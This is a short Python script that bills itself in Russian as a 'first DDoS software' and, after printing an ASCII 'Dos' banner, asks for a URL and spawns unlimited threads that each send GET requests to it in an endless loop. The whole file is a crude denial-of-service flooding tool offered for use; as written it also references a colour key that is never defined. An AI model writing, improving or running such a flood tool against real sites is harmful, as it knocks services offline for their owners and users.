import threading
import requests
import os 

COLOR_CODE = {
    "BLUE": "\033[34m",
    "RESET": "\033[0m",
}
os.system("cls")
print(f'''{COLOR_CODE["RED"]}                                
                                                                                 
                                                                                 
                                                                                     
                                                                                     
______    _           
|  _  \  | |          
| | | |__| | ___  ___ 
| | | / _` |/ _ \/ __|
| |/ / (_| | (_) \__ \
|___/ \__,_|\___/|___/
                                                                                                                            
              это первый ддос софт от кадо) спасибо за использование!                                                        
      ''') 
link = input(f'{COLOR_CODE["RED"]}[$] Введите ссылку: ')
def dos():
 while True:
  requests.get(link)
  
while True:
 threading.Thread(target=dos).start()
